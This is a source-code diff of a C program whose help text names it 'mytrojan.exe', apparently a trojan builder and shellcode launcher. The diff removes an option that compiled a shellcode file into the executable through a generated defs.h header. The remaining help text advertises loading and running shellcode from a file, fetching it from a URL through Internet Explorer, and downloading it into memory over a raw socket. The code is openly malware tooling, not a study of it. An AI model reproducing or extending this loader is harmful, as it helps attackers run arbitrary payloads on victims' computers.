@@ -23,7 +23,6 @@ int main (int argc, char **argv)
 	print_debug = 0;
 	load_from_file = 0;
 	char *evalue = NULL;
-	char *fvalue = NULL;	
 	char *uvalue = NULL;
 	char *wvalue = NULL;
 	int hflag = 0;	
@@ -36,7 +35,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:f:u:d:w:lphXEA")) != -1)
+	while ((c = getopt (argc, argv, "e:u:d:w:lphE")) != -1)
 		switch (c)
 		{
 			case 'd':
@@ -48,9 +47,6 @@ int main (int argc, char **argv)
 			case 'l':
 				load_from_file = 1;
 				break;
-			case 'f':
-				fvalue = optarg;
-				break;			
 			case 'u':
 				uvalue = optarg;
 				break;
@@ -68,8 +64,6 @@ int main (int argc, char **argv)
 				break;
 			case '?':
 				if (optopt == 'e')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'f')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
 				else if (optopt == 'k')
 					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
@@ -105,47 +99,6 @@ int main (int argc, char **argv)
 		fclose(file_def);
 	}
 	
-	// write shellcode from a given file to defs.h
-	else if (fvalue)
-	{
-		printf ("write shellcode from %s to defs.h\n", fvalue);
-
-		FILE *file_def;
-		file_def = fopen ("defs.h","w");
-
-		if (file_def == NULL)
-		{
-			printf ("Error open defs.h\n");
-			return -1;
-		}
-
-		fseek (file_def, 0, SEEK_END);
-
-		// read the shellcode file, write to defs.h
-		FILE *file_sh = fopen ( fvalue, "r" );
-
-		if ( file_sh != NULL )
-		{
-			if(Eflag)
-				fprintf (file_def, "#define FVALUE \"");
-			else
-				fprintf (file_def, "#define FVALUE \"\"\n");
-
-			char line [ 5000 ];
-
-			while ( fgets ( line, sizeof line, file_sh ) != NULL )
-				fprintf (file_def, "%s", line);           
-
-			if(Eflag)
-				fprintf (file_def, "\"\n");
-			//fprintf (file_def, "\\n");
-			fclose ( file_sh );
-		}
-		else
-			printf ("Error open %s\n", fvalue);
-
-		fclose (file_def);
-	}
 	// exec from url
 	else if (uvalue)
 	{
@@ -202,7 +155,6 @@ void print_help()
 	printf("Options:\n");
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.bin\n");
 	printf("   when called with -E call with mytrojan.exe shellcode.txt\n");
-	printf("-f compile shellcode into .exe, needs filename of shellcode file\n");
 	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
 	printf("-d download the shellcode file using different techniques\n");
 	printf("   -d sock -> for downloading a raw shellcode via http in memory and exec (no overhead, use socket)\n");
